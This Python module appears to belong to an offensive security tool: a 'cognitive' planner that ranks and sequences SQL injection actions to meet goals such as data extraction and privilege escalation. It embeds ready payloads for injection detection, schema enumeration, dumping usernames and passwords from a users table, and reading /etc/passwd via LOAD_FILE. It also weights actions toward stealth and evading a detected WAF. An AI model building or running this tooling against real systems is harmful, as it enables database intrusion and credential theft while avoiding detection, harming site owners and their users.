"""
Cognitive Attack Planner

AI-powered attack strategy generation using multi-objective optimization,
risk-aware decision making, and adaptive planning algorithms.
"""

import logging
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
import statistics
import heapq

logger = logging.getLogger(__name__)


class AttackObjective(Enum):
    """Attack objectives with priorities"""
    DETECT_VULNERABILITY = "detect_vulnerability"
    EXTRACT_DATA = "extract_data"
    ENUMERATE_SCHEMA = "enumerate_schema"
    ESCALATE_PRIVILEGES = "escalate_privileges"
    MAINTAIN_STEALTH = "maintain_stealth"
    MAXIMIZE_SPEED = "maximize_speed"


class RiskLevel(Enum):
    """Risk levels for attack actions"""
    MINIMAL = 1
    LOW = 2
    MEDIUM = 3
    HIGH = 4
    CRITICAL = 5


@dataclass
class AttackAction:
    """Represents a single attack action"""
    action_id: str
    name: str
    description: str
    technique: str
    payloads: List[str]
    estimated_time: float  # seconds
    risk_level: RiskLevel
    prerequisites: List[str] = field(default_factory=list)
    success_probability: float = 0.5
    stealth_score: float = 0.5  # 0=noisy, 1=stealthy
    detection_likelihood: float = 0.3  # probability of being detected
    
    def get_score(self, objectives: List[AttackObjective], weights: Dict[str, float]) -> float:
        """Calculate weighted score based on objectives"""
        score = 0.0
        
        # Speed objective
        if AttackObjective.MAXIMIZE_SPEED in objectives:
            speed_score = 1.0 / (self.estimated_time + 1)
            score += speed_score * weights.get('speed', 0.2)
        
        # Stealth objective
        if AttackObjective.MAINTAIN_STEALTH in objectives:
            score += self.stealth_score * weights.get('stealth', 0.3)
            score -= self.detection_likelihood * weights.get('stealth', 0.3)
        
        # Success probability
        score += self.success_probability * weights.get('success', 0.3)
        
        # Risk penalty
        risk_penalty = (self.risk_level.value / 5.0) * weights.get('risk_aversion', 0.2)
        score -= risk_penalty
        
        return score


@dataclass
class AttackPlan:
    """Complete attack plan with sequence of actions"""
    plan_id: str
    objectives: List[AttackObjective]
    actions: List[AttackAction]
    total_estimated_time: float
    overall_risk: RiskLevel
    expected_success_rate: float
    stealth_rating: float
    reasoning: List[str]  # Explanations for each decision


class CognitiveAttackPlanner:
    """
    AI-powered attack planner that generates optimal attack strategies
    using multi-objective optimization and cognitive reasoning.
    """
    
    def __init__(self):
        """Initialize cognitive attack planner"""
        self.available_actions = []
        self.execution_history = []
        self.success_patterns = {}
        self.failure_patterns = {}
        self.learned_strategies = {}
        
        # Initialize action library
        self._initialize_action_library()
        
        logger.info("Cognitive attack planner initialized")
    
    def _initialize_action_library(self):
        """Initialize library of available attack actions"""
        
        # Detection actions
        self.available_actions.extend([
            AttackAction(
                action_id="detect_error_based",
                name="Error-Based Detection",
                description="Test for error-based SQL injection",
                technique="error_based",
                payloads=["'", "\"", "' OR '1'='1"],
                estimated_time=5.0,
                risk_level=RiskLevel.LOW,
                success_probability=0.7,
                stealth_score=0.6,
                detection_likelihood=0.2
            ),
            AttackAction(
                action_id="detect_time_based",
                name="Time-Based Detection",
                description="Test for time-based blind SQL injection",
                technique="time_based",
                payloads=["' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--"],
                estimated_time=10.0,
                risk_level=RiskLevel.MEDIUM,
                success_probability=0.6,
                stealth_score=0.8,
                detection_likelihood=0.3
            ),
            AttackAction(
                action_id="detect_boolean_blind",
                name="Boolean-Based Blind Detection",
                description="Test for boolean-based blind SQL injection",
                technique="boolean_blind",
                payloads=["' AND 1=1--", "' AND 1=2--"],
                estimated_time=8.0,
                risk_level=RiskLevel.LOW,
                success_probability=0.8,
                stealth_score=0.9,
                detection_likelihood=0.1
            ),
            AttackAction(
                action_id="detect_union",
                name="UNION-Based Detection",
                description="Test for UNION-based SQL injection",
                technique="union_based",
                payloads=["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--"],
                estimated_time=7.0,
                risk_level=RiskLevel.MEDIUM,
                success_probability=0.7,
                stealth_score=0.5,
                detection_likelihood=0.4
            ),
        ])
        
        # Exploitation actions
        self.available_actions.extend([
            AttackAction(
                action_id="extract_version",
                name="Extract Database Version",
                description="Extract database version information",
                technique="data_extraction",
                payloads=["' UNION SELECT @@version--"],
                estimated_time=3.0,
                risk_level=RiskLevel.LOW,
                prerequisites=["detect_union"],
                success_probability=0.9,
                stealth_score=0.7,
                detection_likelihood=0.2
            ),
            AttackAction(
                action_id="enumerate_tables",
                name="Enumerate Database Tables",
                description="List all tables in current database",
                technique="schema_enumeration",
                payloads=["' UNION SELECT table_name FROM information_schema.tables--"],
                estimated_time=10.0,
                risk_level=RiskLevel.MEDIUM,
                prerequisites=["extract_version"],
                success_probability=0.85,
                stealth_score=0.6,
                detection_likelihood=0.3
            ),
            AttackAction(
                action_id="extract_credentials",
                name="Extract User Credentials",
                description="Extract sensitive user data",
                technique="data_extraction",
                payloads=["' UNION SELECT username,password FROM users--"],
                estimated_time=15.0,
                risk_level=RiskLevel.HIGH,
                prerequisites=["enumerate_tables"],
                success_probability=0.7,
                stealth_score=0.3,
                detection_likelihood=0.6
            ),
        ])
        
        # Advanced actions
        self.available_actions.extend([
            AttackAction(
                action_id="check_privileges",
                name="Check Current Privileges",
                description="Determine current database user privileges",
                technique="privilege_check",
                payloads=["' UNION SELECT current_user--"],
                estimated_time=4.0,
                risk_level=RiskLevel.LOW,
                prerequisites=["detect_union"],
                success_probability=0.9,
                stealth_score=0.8,
                detection_likelihood=0.1
            ),
            AttackAction(
                action_id="test_file_ops",
                name="Test File Operations",
                description="Check if file read/write is possible",
                technique="file_operations",
                payloads=["' UNION SELECT LOAD_FILE('/etc/passwd')--"],
                estimated_time=6.0,
                risk_level=RiskLevel.HIGH,
                prerequisites=["check_privileges"],
                success_probability=0.4,
                stealth_score=0.4,
                detection_likelihood=0.7
            ),
        ])
    
    def generate_attack_plan(self, 
                           objectives: List[AttackObjective],
                           target_info: Dict[str, Any],
                           constraints: Optional[Dict[str, Any]] = None) -> AttackPlan:
        """
        Generate optimal attack plan using cognitive reasoning.
        
        Args:
            objectives: List of attack objectives
            target_info: Information about the target
            constraints: Constraints (time_limit, risk_tolerance, etc.)
        
        Returns:
            Optimized attack plan
        """
        logger.info(f"Generating attack plan for objectives: {[obj.value for obj in objectives]}")
        
        constraints = constraints or {}
        max_time = constraints.get('max_time', 300)  # 5 minutes default
        risk_tolerance = constraints.get('risk_tolerance', RiskLevel.MEDIUM)
        
        # Define objective weights
        weights = self._calculate_objective_weights(objectives, target_info)
        
        # Generate candidate actions
        candidate_actions = self._select_candidate_actions(
            objectives, target_info, risk_tolerance
        )
        
        # Score and rank actions
        scored_actions = [
            (action, action.get_score(objectives, weights))
            for action in candidate_actions
        ]
        scored_actions.sort(key=lambda x: x[1], reverse=True)
        
        # Build plan using greedy algorithm with lookahead
        selected_actions, reasoning = self._build_optimal_sequence(
            scored_actions, max_time, risk_tolerance, objectives
        )
        
        # Calculate plan metrics
        total_time = sum(action.estimated_time for action in selected_actions)
        avg_risk = statistics.mean([action.risk_level.value for action in selected_actions]) if selected_actions else 0
        overall_risk = RiskLevel(int(round(avg_risk))) if avg_risk > 0 else RiskLevel.MINIMAL
        
        avg_success = statistics.mean([action.success_probability for action in selected_actions]) if selected_actions else 0
        avg_stealth = statistics.mean([action.stealth_score for action in selected_actions]) if selected_actions else 0
        
        plan = AttackPlan(
            plan_id=f"plan_{len(self.learned_strategies)}",
            objectives=objectives,
            actions=selected_actions,
            total_estimated_time=total_time,
            overall_risk=overall_risk,
            expected_success_rate=avg_success,
            stealth_rating=avg_stealth,
            reasoning=reasoning
        )
        
        # Store for learning
        self.learned_strategies[plan.plan_id] = plan
        
        logger.info(f"Generated plan with {len(selected_actions)} actions, "
                   f"estimated time: {total_time:.1f}s, risk: {overall_risk.name}")
        
        return plan
    
    def _calculate_objective_weights(self, 
                                    objectives: List[AttackObjective],
                                    target_info: Dict[str, Any]) -> Dict[str, float]:
        """Calculate weights based on objectives and target"""
        weights = {
            'speed': 0.2,
            'stealth': 0.3,
            'success': 0.3,
            'risk_aversion': 0.2
        }
        
        # Adjust based on objectives
        if AttackObjective.MAXIMIZE_SPEED in objectives:
            weights['speed'] = 0.4
            weights['stealth'] = 0.2
        
        if AttackObjective.MAINTAIN_STEALTH in objectives:
            weights['stealth'] = 0.5
            weights['speed'] = 0.1
            weights['risk_aversion'] = 0.3
        
        # Adjust based on target
        if target_info.get('waf_detected'):
            weights['stealth'] += 0.2
            weights['speed'] -= 0.1
        
        # Normalize
        total = sum(weights.values())
        return {k: v/total for k, v in weights.items()}
    
    def _select_candidate_actions(self,
                                 objectives: List[AttackObjective],
                                 target_info: Dict[str, Any],
                                 risk_tolerance: RiskLevel) -> List[AttackAction]:
        """Select candidate actions based on objectives and constraints"""
        candidates = []
        
        for action in self.available_actions:
            # Filter by risk tolerance
            if action.risk_level.value > risk_tolerance.value:
                continue
            
            # Filter by objectives
            if AttackObjective.DETECT_VULNERABILITY in objectives:
                if 'detect' in action.action_id:
                    candidates.append(action)
            
            if AttackObjective.EXTRACT_DATA in objectives:
                if 'extract' in action.action_id or 'enum' in action.action_id:
                    candidates.append(action)
            
            if AttackObjective.ENUMERATE_SCHEMA in objectives:
                if 'enumerate' in action.action_id or 'enum' in action.action_id:
                    candidates.append(action)
            
            if AttackObjective.ESCALATE_PRIVILEGES in objectives:
                if 'privilege' in action.action_id or 'file' in action.action_id:
                    candidates.append(action)
        
        # Remove duplicates
        return list({action.action_id: action for action in candidates}.values())
    
    def _build_optimal_sequence(self,
                               scored_actions: List[Tuple[AttackAction, float]],
                               max_time: float,
                               risk_tolerance: RiskLevel,
                               objectives: List[AttackObjective]) -> Tuple[List[AttackAction], List[str]]:
        """Build optimal action sequence respecting prerequisites"""
        selected = []
        reasoning = []
        completed_actions = set()
        total_time = 0
        
        # Priority queue for actions (score, action)
        action_queue = [(-score, action) for action, score in scored_actions]
        heapq.heapify(action_queue)
        
        while action_queue and total_time < max_time:
            neg_score, action = heapq.heappop(action_queue)
            score = -neg_score
            
            # Check prerequisites
            if not all(prereq in completed_actions for prereq in action.prerequisites):
                # Try to add prerequisite actions first
                continue
            
            # Check time constraint
            if total_time + action.estimated_time > max_time:
                reasoning.append(f"Skipped {action.name}: would exceed time limit")
                continue
            
            # Add action
            selected.append(action)
            completed_actions.add(action.action_id)
            total_time += action.estimated_time
            
            reasoning.append(
                f"Selected {action.name}: score={score:.3f}, "
                f"risk={action.risk_level.name}, "
                f"stealth={action.stealth_score:.2f}"
            )
        
        return selected, reasoning
    
    def adapt_plan(self, 
                  current_plan: AttackPlan,
                  execution_results: List[Dict[str, Any]]) -> AttackPlan:
        """
        Adapt attack plan based on execution results.
        
        Args:
            current_plan: Current attack plan
            execution_results: Results from executed actions
        
        Returns:
            Adapted attack plan
        """
        logger.info("Adapting attack plan based on execution results")
        
        # Analyze what worked and what didn't
        successful_actions = [r for r in execution_results if r.get('success')]
        failed_actions = [r for r in execution_results if not r.get('success')]
        
        # Update success probabilities
        for result in execution_results:
            action_id = result.get('action_id')
            success = result.get('success')
            
            # Update patterns
            if success:
                if action_id not in self.success_patterns:
                    self.success_patterns[action_id] = []
                self.success_patterns[action_id].append(result)
            else:
                if action_id not in self.failure_patterns:
                    self.failure_patterns[action_id] = []
                self.failure_patterns[action_id].append(result)
        
        # Generate new plan with updated information
        remaining_objectives = current_plan.objectives.copy()
        
        # Remove achieved objectives
        if successful_actions and AttackObjective.DETECT_VULNERABILITY in remaining_objectives:
            remaining_objectives.remove(AttackObjective.DETECT_VULNERABILITY)
        
        if remaining_objectives:
            # Generate new plan for remaining objectives
            target_info = {
                'execution_history': execution_results,
                'successful_techniques': [r.get('technique') for r in successful_actions]
            }
            
            return self.generate_attack_plan(
                remaining_objectives,
                target_info,
                constraints={'max_time': 180}  # 3 minutes for adaptation
            )
        
        return current_plan
    
    def explain_plan(self, plan: AttackPlan) -> str:
        """Generate human-readable explanation of the attack plan"""
        explanation = []
        explanation.append("=" * 70)
        explanation.append("COGNITIVE ATTACK PLAN EXPLANATION")
        explanation.append("=" * 70)
        explanation.append(f"\nPlan ID: {plan.plan_id}")
        explanation.append(f"Objectives: {', '.join([obj.value for obj in plan.objectives])}")
        explanation.append(f"\nPlan Metrics:")
        explanation.append(f"  • Total Actions: {len(plan.actions)}")
        explanation.append(f"  • Estimated Time: {plan.total_estimated_time:.1f} seconds")
        explanation.append(f"  • Overall Risk: {plan.overall_risk.name}")
        explanation.append(f"  • Expected Success Rate: {plan.expected_success_rate:.1%}")
        explanation.append(f"  • Stealth Rating: {plan.stealth_rating:.1%}")
        
        explanation.append(f"\nAction Sequence:")
        for i, action in enumerate(plan.actions, 1):
            explanation.append(f"\n{i}. {action.name}")
            explanation.append(f"   Technique: {action.technique}")
            explanation.append(f"   Risk: {action.risk_level.name}, Time: {action.estimated_time:.1f}s")
            explanation.append(f"   Success Probability: {action.success_probability:.1%}")
            if action.prerequisites:
                explanation.append(f"   Prerequisites: {', '.join(action.prerequisites)}")
        
        explanation.append(f"\nReasoning:")
        for reason in plan.reasoning:
            explanation.append(f"  • {reason}")
        
        explanation.append("\n" + "=" * 70)
        return "\n".join(explanation)
